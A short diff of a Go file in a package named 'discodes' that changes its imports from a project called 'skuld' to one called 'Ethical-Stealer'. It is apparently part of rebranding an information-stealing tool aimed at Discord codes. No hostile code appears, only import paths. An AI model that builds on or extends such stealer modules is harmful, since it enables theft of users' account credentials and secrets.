@@ -1,8 +1,8 @@
 package discodes
 
 import (
-	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/hardware"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/requests"
 	"os"
 	"path/filepath"
 	"strings"
